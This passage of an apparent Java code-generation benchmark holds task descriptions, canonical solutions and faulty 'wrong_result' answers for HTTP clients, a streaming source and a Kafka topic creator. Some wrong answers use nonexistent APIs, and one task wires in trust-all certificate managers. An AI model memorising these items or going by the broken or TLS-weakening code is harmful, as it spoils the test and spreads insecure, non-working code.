return \"en-US\";\n        return locale.getLanguage() + \"-\" + locale.getCountry();\n    }\n\n    private void addExtraHeaders(Request.Builder requestBuilder, MmsConfig.Overridden mmsConfig) {\n        if (mmsConfig != null) {\n            requestBuilder.header(\"X-MMS-Config\", mmsConfig.toString());\n        }\n    }\n\n    private void logHttpHeaders(Map<String, List<String>> headers) {\n        Logger.getLogger(MmsHttpClient.class.getName()).fine(\"HTTP Headers: \" + headers);\n    }\n\n    public HttpURLConnection openConnection(URL url, Proxy proxy) throws MalformedURLException {\n        if (\"https\".equals(url.getProtocol())) {\n            return (HttpURLConnection) url.openConnection(proxy);\n        } else {\n            return (HttpURLConnection) url.openConnection(proxy);\n        }\n    }\n\n    public void setContext(Context context) {\n        this.mContext = context;\n    }\n\n    public void setSocketFactory(okhttp3.SocketFactory socketFactory) {\n        this.mSocketFactory = socketFactory;\n    }\n\n    public void setHostResolver(MmsNetworkManager hostResolver) {\n        this.mHostResolver = hostResolver;\n    }\n\n    public void setConnectionPool(okhttp3.ConnectionPool connectionPool) {\n        this.mConnectionPool = connectionPool;\n    }\n}\n```"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Create a Java class that handles HTTP POST requests to a specified URL, with callback functionality for success and failure cases.\n\nClass Description: The HttpRequestHandler class is responsible for sending HTTP POST requests to a predefined URL. It encapsulates the connection setup, request parameter encoding, and response handling, providing callback methods to notify the caller of the request outcome.\n\nAttributes:\n- packageName: String - The package name to be sent as a parameter in the POST request\n- callback: OnRequestCallback - The callback interface to handle request success or failure\n\nMethods:\n- sendPostRequest(): void - Sends a POST request to the configured URL with the packageName as a parameter. Handles connection setup, timeout configuration, request writing, and response processing. Notifies the callback of success or failure.\n- HttpRequestHandler(String, OnRequestCallback): Constructor - Initializes the handler with a package name and callback interface\n\nInterface:\n- OnRequestCallback: Interface defining callback methods for request outcomes\n  - onSuccess(): void - Called when the request succeeds (response code < 400)\n  - onFailure(Exception): void - Called when the request fails (response code >= 400 or IO exception occurs)",
    "Canonical_solution": "import java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpRequestHandler {\n\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback/app\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"pkg\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(packageName, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n        void onFailure(Exception e);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic interface OnRequestCallback {\n    void onSuccess();\n    void onFailure(Exception e);\n}\n\npublic class HttpRequestHandler {\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(\"http://example.com/api\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            String params = \"packageName=\" + URLEncoder.encode(packageName, \"UTF-8\");\n            try (OutputStream os = connection.getOutputStream()) {\n                os.write(params.getBytes(StandardCharsets.UTF_8));\n            }\n            int responseCode = connection.getResponseCode();\n            if (responseCode < 400) {\n                callback.onSuccess();\n            } else {\n                callback.onFailure(new Exception(\"HTTP error code: \" + responseCode));\n            }\n        } catch (IOException e) {\n            callback.onFailure(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a Java function that sends an HTTP POST request to a specified URL with a given message, verifies the response status code, and compares the response content with the original message.\n\nFunction Description: The function establishes an HTTP connection using HttpURLConnection, sends a POST request with the provided message as the request body, reads the response, and asserts that the response status code is OK (200) and that the response content matches the original message. If the response doesn't match, it prints the hexadecimal representation of the response.\n\nInput: \n- message: String - The message to be sent in the request body\n- url: String - The endpoint path to which the request is sent (appended to a base URL)\n\nOutput: \n- None (void) - The function performs assertions and may print debug information but doesn't return any value\n- Throws: IOException - If any I/O error occurs during the HTTP communication",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate void runTestViaJavaImpl(final String message, String url) throws IOException {\n    HttpURLConnection urlcon = null;\n    try {\n        String uri = getBaseUrl() + \"/servletContext/\" + url;\n        urlcon = (HttpURLConnection) new URL(uri).openConnection();\n        urlcon.setInstanceFollowRedirects(true);\n        urlcon.setRequestProperty(\"Connection\", \"close\");\n        urlcon.setRequestMethod(\"POST\");\n        urlcon.setDoInput(true);\n        urlcon.setDoOutput(true);\n        OutputStream os = urlcon.getOutputStream();\n        os.write(message.getBytes());\n        os.close();\n        Assert.assertEquals(StatusCodes.OK, urlcon.getResponseCode());\n        InputStream is = urlcon.getInputStream();\n\n        ByteArrayOutputStream bytes = new ByteArrayOutputStream();\n        byte[] buf = new byte[256];\n        int len;\n        while ((len = is.read(buf)) > 0) {\n            bytes.write(buf, 0, len);\n        }\n        is.close();\n        final String response = new String(bytes.toByteArray(), 0, bytes.size());\n        if (!message.equals(response)) {\n            System.out.println(String.format(\"response=%s\", Hex.encodeHexString(response.getBytes())));\n        }\n        Assert.assertEquals(message, response);\n    } finally {\n        if (urlcon != null) {\n            urlcon.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class HttpPostSender {\n    public void sendPostRequest(String message, String url) throws IOException {\n        URL baseUrl = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) baseUrl.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"text/plain\");\n\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] input = message.getBytes(StandardCharsets.UTF_8);\n            os.write(input);\n            os.flush();\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n\n        try (InputStream is = conn.getInputStream()) {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            int data;\n            while ((data = is.read()) != -1) {\n                baos.write(data);\n            }\n            byte[] responseBytes = baos.toByteArray();\n\n            String responseString = new String(responseBytes, StandardCharsets.UTF_8);\n            if (!responseString.equals(message)) {\n                System.out.println(toHex(responseBytes));\n            }\n        }\n    }\n\n    private static String toHex(byte[] bytes) {\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for streaming content with support for caching, custom headers, and SSL verification.\n\nClass Description: HttpUrlSource is a class that provides HTTP content streaming functionality with features like range requests, redirect handling, SSL customization, and header injection. It's designed to work with a caching system and stores source information (URL, length, MIME type) persistently.\n\nAttributes:\n- sourceInfoStorage: SourceInfoStorage - Stores and retrieves source information (URL, length, MIME type)\n- headerInjector: HeaderInjector - Injects custom headers into HTTP requests\n- v: HostnameVerifier - Custom hostname verifier for SSL connections\n- trustAllCerts: TrustManager[] - Custom trust managers for SSL connections\n- sourceInfo: SourceInfo - Contains URL, content length and MIME type information\n- connection: HttpURLConnection - Active HTTP connection\n- inputStream: InputStream - Stream for reading content\n\nMethods:\n- HttpUrlSource(String, HostnameVerifier, TrustManager[]) -> void - Constructor with URL, hostname verifier and trust managers\n- HttpUrlSource(String, SourceInfoStorage, HostnameVerifier, TrustManager[]) -> void - Constructor with additional source info storage\n- HttpUrlSource(String, SourceInfoStorage, HeaderInjector, HostnameVerifier, TrustManager[]) -> void - Full constructor with all dependencies\n- length() -> long - Returns content length, fetches if not known\n- open(long) -> void - Opens connection at specified offset\n- close() -> void - Closes current connection\n- read(byte[]) -> int - Reads data into buffer\n- getMime() -> String - Returns MIME type, fetches if not known\n- getUrl() -> String - Returns source URL\n- openConnection(long, int) -> HttpURLConnection - Internal method to open connection with offset and timeout\n- injectCustomHeaders(HttpURLConnection, String) -> void - Injects custom headers into connection\n- readSourceAvailableBytes(HttpURLConnection, long, int) -> long - Calculates available bytes based on response\n- getContentLength(HttpURLConnection) -> long - Extracts content length from headers\n- fetchContentInfo() -> void - Fetches content information (length and MIME type)",
    "Canonical_solution": "import com.danikula.videocache.headers.EmptyHeadersInjector;\nimport com.danikula.videocache.headers.HeaderInjector;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorage;\nimport com.danikula.videocache.sourcestorage.SourceInfoStorageFactory;\n\nimport java.io.BufferedInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InterruptedIOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Map;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\n\npublic class HttpUrlSource implements Source {\n\n    private static final int MAX_REDIRECTS = 5;\n    private final SourceInfoStorage sourceInfoStorage;\n    private final HeaderInjector headerInjector;\n    private final HostnameVerifier v;\n    private final TrustManager[] trustAllCerts;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, SourceInfoStorageFactory.newEmptySourceInfoStorage(), v, trustAllCerts);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this(url, sourceInfoStorage, new EmptyHeadersInjector(), v, trustAllCerts);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.headerInjector = headerInjector;\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        SourceInfo sourceInfo = sourceInfoStorage.get(url);\n        this.sourceInfo = sourceInfo != null ? sourceInfo :\n            new SourceInfo(url, Integer.MIN_VALUE, ProxyCacheUtils.getSupposablyMime(url));\n    }\n\n    @Override\n    public synchronized long length() throws ProxyCacheException {\n        if (sourceInfo.length == Integer.MIN_VALUE) {\n            fetchContentInfo();\n        }\n        return sourceInfo.length;\n    }\n\n    @Override\n    public void open(long offset) throws ProxyCacheException {\n        try {\n            connection = openConnection(offset, -1);\n            String mime = connection.getContentType();\n            inputStream = new BufferedInputStream(connection.getInputStream(), DEFAULT_BUFFER_SIZE);\n            long length = readSourceAvailableBytes(connection, offset, connection.getResponseCode());\n            this.sourceInfo = new SourceInfo(sourceInfo.url, length, mime);\n            this.sourceInfoStorage.put(sourceInfo.url, sourceInfo);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error opening connection for \" + sourceInfo.url + \" with offset \" + offset, e);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) throws IOException {\n        long contentLength = getContentLength(connection);\n        return responseCode == HTTP_OK ? contentLength\n            : responseCode == HTTP_PARTIAL ? contentLength + offset : sourceInfo.length;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        String contentLengthValue = connection.getHeaderField(\"Content-Length\");\n        return contentLengthValue == null ? -1 : Long.parseLong(contentLengthValue);\n    }\n\n    @Override\n    public void close() throws ProxyCacheException {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (NullPointerException | IllegalArgumentException e) {\n                throw new RuntimeException(\"Error closing connection\", e);\n            }\n        }\n    }\n\n    @Override\n    public int read(byte[] buffer) throws ProxyCacheException {\n        if (inputStream == null) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url + \": connection is absent!\");\n        }\n        try {\n            return inputStream.read(buffer, 0, buffer.length);\n        } catch (InterruptedIOException e) {\n            throw new InterruptedProxyCacheException(\"Reading source \" + sourceInfo.url + \" is interrupted\", e);\n        } catch (IOException e) {\n            throw new ProxyCacheException(\"Error reading data from \" + sourceInfo.url, e);\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException, ProxyCacheException {\n        HttpURLConnection connection;\n        boolean redirected;\n        int redirectCount = 0;\n        String url = this.sourceInfo.url;\n        do {\n            if (url.startsWith(\"https\") && v != null && trustAllCerts != null) {\n                connection = (HttpURLConnection) new URL(url).openConnection();\n                ((HttpsURLConnection) connection).setHostnameVerifier(v);\n                try {\n                    SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                    sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n                    SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(sslSocketFactory);\n                    ((HttpsURLConnection) connection).setHostnameVerifier(v);\n                } catch (NoSuchAlgorithmException | KeyManagementException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                connection = (HttpURLConnection) new URL(url).openConnection();\n            }\n            injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        if (extraHeaders == null) {\n            return;\n        }\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUrlSource {\n    private SourceInfoStorage sourceInfoStorage;\n    private HeaderInjector headerInjector;\n    private HostnameVerifier v;\n    private TrustManager[] trustAllCerts;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public HttpUrlSource(String url, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        sourceInfoStorage = new SourceInfoStorage();\n        headerInjector = new HeaderInjector();\n        sourceInfo = getSourceInfo(url);\n        openConnection(0, 0);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        headerInjector = new HeaderInjector();\n        sourceInfo = getSourceInfo(url);\n        openConnection(0, 0);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage sourceInfoStorage, HeaderInjector headerInjector, HostnameVerifier v, TrustManager[] trustAllCerts) {\n        this.sourceInfoStorage = sourceInfoStorage;\n        this.headerInjector = headerInjector;\n        this.v = v;\n        this.trustAllCerts = trustAllCerts;\n        sourceInfo = getSourceInfo(url);\n        openConnection(0, 0);\n    }\n\n    private SourceInfo getSourceInfo(String url) {\n        SourceInfo info = sourceInfoStorage.getSourceInfo(url);\n        if (info != null) {\n            return info;\n        }\n        fetchContentInfo();\n        return sourceInfo;\n    }\n\n    private void fetchContentInfo() {\n        try {\n            connection = openConnection(0, 0);\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n            sourceInfo = new SourceInfo();\n            sourceInfo.url = getUrl();\n            sourceInfo.length = getContentLength(connection);\n            sourceInfo.mime = getMime(connection);\n            sourceInfoStorage.storeSourceInfo(getUrl(), sourceInfo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private HttpURLConnection openConnection(long offset, int timeout) throws IOException {\n        URL url = new URL(getUrl());\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, new TrustManager[]{trustAllCerts}, null);\n        conn.setSSLSocketFactory(sslContext.getSocketFactory());\n        conn.setHostnameVerifier(v);\n        conn.setConnectTimeout(timeout);\n        conn.setReadTimeout(timeout);\n        if (offset > 0) {\n            conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n        }\n        return conn;\n    }\n\n    public long length() {\n        if (sourceInfo.length > 0) {\n            return sourceInfo.length;\n        }\n        fetchContentInfo();\n        return sourceInfo.length;\n    }\n\n    public void open(long offset) {\n        try {\n            connection = openConnection(offset, 5000);\n            connection.connect();\n            inputStream = connection.getInputStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public int read(byte[] buffer) {\n        if (inputStream == null) {\n            return -1;\n        }\n        try {\n            return inputStream.read(buffer);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public String getMime() {\n        if (sourceInfo.mime != null) {\n            return sourceInfo.mime;\n        }\n        fetchContentInfo();\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String headers) {\n        if (headerInjector != null) {\n            headerInjector.injectHeaders(connection, headers);\n        }\n    }\n\n    private long readSourceAvailableBytes(HttpURLConnection connection, long offset, int bufferSize) {\n        long available = 0;\n        try {\n            if (connection.getResponseCode() == HttpURLConnection.HTTP_PARTIAL) {\n                String contentRange = connection.getHeaderField(\"Content-Range\");\n                if (contentRange != null) {\n                    String range = contentRange.substring(contentRange.indexOf(\" \") + 1);\n                    available = Long.parseLong(range.split(\"-\")[1]);\n                }\n            } else {\n                available = getContentLength(connection);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return available;\n    }\n\n    private long getContentLength(HttpURLConnection connection) {\n        long length = 0;\n        String contentLength = connection.getHeaderField(\"Content-Length\");\n        if (contentLength != null) {\n            length = Long.parseLong(contentLength);\n        }\n        return length;\n    }\n}"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Kafka topic using Java's AdminClient API with configurable properties, partitions, and replication factor.\n\nClass Description: The KafkaTopicCreator class provides functionality to create Kafka topics programmatically. It encapsulates the AdminClient configuration and topic creation logic, handling the connection lifecycle and operation timeout.\n\nAttributes:\n- adminClientProperties: Map<String, Object> - Configuration properties for the AdminClient, initialized from KafkaProperties\n- operationTimeout: int - Timeout duration in seconds for Kafka operations (default: 30)\n\nMethods:\n- createTopic(String topicName, int partitions, short replicationFactor) -> void - Creates a new Kafka topic with the specified name, partition count, and replication factor. Throws Exception if operation fails or times out.\n- getAdminClientProperties() -> Map<String, Object> - Returns an unmodifiable view of the AdminClient configuration properties\n\nConstructor:\n- KafkaTopicCreator(KafkaProperties kafkaProperties) - Initializes the class with Kafka configuration properties",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.springframework.boot.autoconfigure.kafka.KafkaProperties;\nimport java.util.Collections;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class KafkaTopicCreator {\n\n    private final Map<String, Object> adminClientProperties;\n    private final int operationTimeout = 30;\n\n    public KafkaTopicCreator(KafkaProperties kafkaProperties) {\n        this.adminClientProperties = kafkaProperties.buildAdminProperties(null);\n    }\n\n    public void createTopic(String topicName, int partitions, short replicationFactor) throws Exception {\n        try (AdminClient adminClient = AdminClient.create(this.adminClientProperties)) {\n            NewTopic newTopic = new NewTopic(topicName, partitions, replicationFactor);\n            CreateTopicsResult createTopicsResult = adminClient.createTopics(Collections.singletonList(newTopic));\n            KafkaFuture<Void> future = createTopicsResult.all();\n            future.get(this.operationTimeout, TimeUnit.SECONDS);\n        }\n    }\n\n    public Map<String, Object> getAdminClientProperties() {\n        return Collections.unmodifiableMap(this.adminClientProperties);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 34,
    "wrong_result": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.CreateTopicRequest;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicCreator {\n    private final Map<String, Object> adminClientProperties;\n    private final int operationTimeout;\n\n    public KafkaTopicCreator(KafkaProperties kafkaProperties) {\n        this.adminClientProperties = kafkaProperties.getProps();\n        this.operationTimeout = 30;\n    }\n\n    public void createTopic(String topicName, int partitions, short replicationFactor) throws Exception {\n        Properties props = new Properties();\n        props.putAll(adminClientProperties);\n        AdminClient adminClient = AdminClient.create(props);\n        try {\n            List<CreateTopicRequest> requests = new ArrayList<>();\n            requests.add(new CreateTopicRequest(topicName, partitions, replicationFactor));\n            CreateTopicOptions options = new CreateTopicOptions().timeoutMs(operationTimeout * 1000);\n            adminClient.createTopics(requests, options).get();\n        } finally {\n            adminClient.close();\n        }\n    }\n\n    public Map<String, Object> getAdminClientProperties() {\n        return Collections.unmodifiableMap(adminClientProperties);\n    }\n}"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Java class that implements a REST client using HttpURLConnection for making HTTP requests with support for authentication, headers, and parameters.\n\nClass Description: The RestClient class provides functionality to send HTTP requests to a specified server with configurable protocol, host, port, and authentication. It supports various HTTP methods, request parameters, headers, and handles response processing.\n\nAttributes:\n- protocol: [Protocol] - The protocol to use (HTTP/HTTPS)\n- host: [String] - The hostname or IP address of the server\n- port: [int] - The port number of the server\n- username: [String] - The username for basic authentication (nullable)\n- password: [String] - The password for basic authentication (nullable)\n\nMethods:\n- getUrl: [String path, Param... param] -> [URL] - Constructs a complete URL from path and parameters\n- send: [Method method, String path, Option[] options, StreamConsumer outStreamConsumer] -> [CompletableFuture<Response>] - Sends an HTTP request asynchronously and returns a future containing the response\n- tryGetResponseTextFrom: [HttpURLConnection conn, int status] -> [String] - Reads the response text from the connection\n- getResponseCodeFrom: [HttpURLConnection conn] -> [int] - Gets the response code from the connection, handling 404 specifically\n\nHelper Interfaces/Classes:\n- StreamConsumer: Functional interface for writing to output streams\n- SingletonIterator: Utility iterator for single-element collections\n- Response: Contains status code, response text, and headers (implied but not shown in code)\n- RestException: Custom exception for REST-related errors (implied but not shown in code)",
    "Canonical_solution": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.Iterator;\nimport java.util.NoSuchElementException;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.function.Consumer;\nimport java.util.stream.Stream;\n\nfinal class RestClient {\n\n    private static final int BUFFER_SIZE = 1024;\n    private static final Iterator<String> NO_ITERATOR = new Iterator<String>() {\n        @Override\n        public boolean hasNext() { return false; }\n\n        @Override\n        public String next() {\n            throw new NoSuchElementException(\"This method should never be called.\");\n        }\n    };\n\n    private final Protocol protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    RestClient(Protocol protocol, String host, int port, String username, String password) {\n        this.protocol = Objects.requireNonNull(protocol);\n        this.host     = Objects.requireNonNull(host);\n        this.port     = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    protected URL getUrl(String path, Param... param) {\n        final StringBuilder url = new StringBuilder()\n            .append(getProtocol())\n            .append(\"://\")\n            .append(host);\n\n        if (port > 0) {\n            url.append(\":\").append(port);\n        }\n\n        url.append(\"/\").append(path);\n\n        if (param.length > 0) {\n            url.append(\n                Stream.of(param)\n                    .map(p -> encode(p.getKey()) + \"=\" + encode(p.getValue()))\n                    .collect(joining(\"&\", \"?\", \"\"))\n            );\n        }\n\n        try {\n            return new URL(url.toString());\n        } catch (Exception ex) {\n            throw new IllegalArgumentException(\"Error building URL\", ex);\n        }\n    }\n\n    private CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        return CompletableFuture.supplyAsync(() -> {\n            HttpURLConnection conn = null;\n            try {\n                final Param[] params = Stream.of(options)\n                    .filter(o -> o.getType() == PARAM)\n                    .map(Param.class::cast)\n                    .toArray(Param[]::new);\n                \n                final Header[] headers = Stream.of(options)\n                    .filter(o -> o.getType() == HEADER)\n                    .map(Header.class::cast)\n                    .toArray(Header[]::new);\n                \n                conn = (HttpURLConnection) getUrl(path, params).openConnection();\n                conn.setRequestMethod(method.name());\n                conn.setUseCaches(false);\n                conn.setAllowUserInteraction(false);\n\n                if (username != null && password != null) {\n                    final String encoding = Base64.getEncoder()\n                        .encodeToString((username + \":\" + password).getBytes());\n                    conn.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n                }\n\n                for (final Header header : headers) {\n                    conn.setRequestProperty(header.getKey(), header.getValue());\n                }\n\n                final boolean doOutput = outStreamConsumer != IGNORE;\n                conn.setDoOutput(doOutput);\n                conn.connect();\n\n                if (doOutput) {\n                    try (OutputStream out = conn.getOutputStream()) {\n                        outStreamConsumer.writeTo(out);\n                        out.flush();\n                    }\n                }\n\n                int status = getResponseCodeFrom(conn);\n                String text = tryGetResponseTextFrom(conn, status);\n                return new Response(status, text, conn.getHeaderFields());\n            } catch (Exception ex) {\n                throw new RestException(ex, protocol, method, username, host, port, path, options);\n            } finally {\n                if (conn != null) conn.disconnect();\n            }\n        });\n    }\n\n    private static String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        try (BufferedReader rd = new BufferedReader(\n            new InputStreamReader(status >= 400 \n                ? conn.getErrorStream() \n                : conn.getInputStream()))) {\n            \n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    private static int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        try {\n            return conn.getResponseCode();\n        } catch (FileNotFoundException ex) {\n            return 404;\n        }\n    }\n\n    @FunctionalInterface\n    private interface StreamConsumer {\n        void writeTo(OutputStream out) throws IOException;\n    }\n\n    private static final class SingletonIterator<E> implements Iterator<E> {\n        private final E e;\n        private boolean hasNext = true;\n\n        private SingletonIterator(E e) { this.e = e; }\n\n        public boolean hasNext() { return hasNext; }\n\n        public E next() {\n            if (hasNext) {\n                hasNext = false;\n                return e;\n            }\n            throw new NoSuchElementException();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RestClient {\n    public enum Method {\n        GET, POST, PUT, DELETE, HEAD, OPTIONS, TRACE\n    }\n\n    private static class Option {\n        private final String name;\n        private final String value;\n\n        public Option(String name, String value) {\n            this.name = name;\n            this.value = value;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public String getValue() {\n            return value;\n        }\n    }\n\n    private static class Param {\n        private final String name;\n        private final String value;\n\n        public Param(String name, String value) {\n            this.name = name;\n            this.value = value;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public String getValue() {\n            return value;\n        }\n    }\n\n    @FunctionalInterface\n    public interface StreamConsumer {\n        void write(OutputStream os) throws IOException;\n    }\n\n    private String protocol;\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n\n    public String getUrl(String path, Param... param) {\n        StringBuilder urlBuilder = new StringBuilder(protocol + \"://\").append(host);\n        if (port != 80 && port != 443) {\n            urlBuilder.append(\":\").append(port);\n        }\n        urlBuilder.append(path);\n        if (param.length > 0) {\n            urlBuilder.append(\"?\");\n            for (int i = 0; i < param.length; i++) {\n                if (i > 0) urlBuilder.append(\"&\");\n                try {\n                    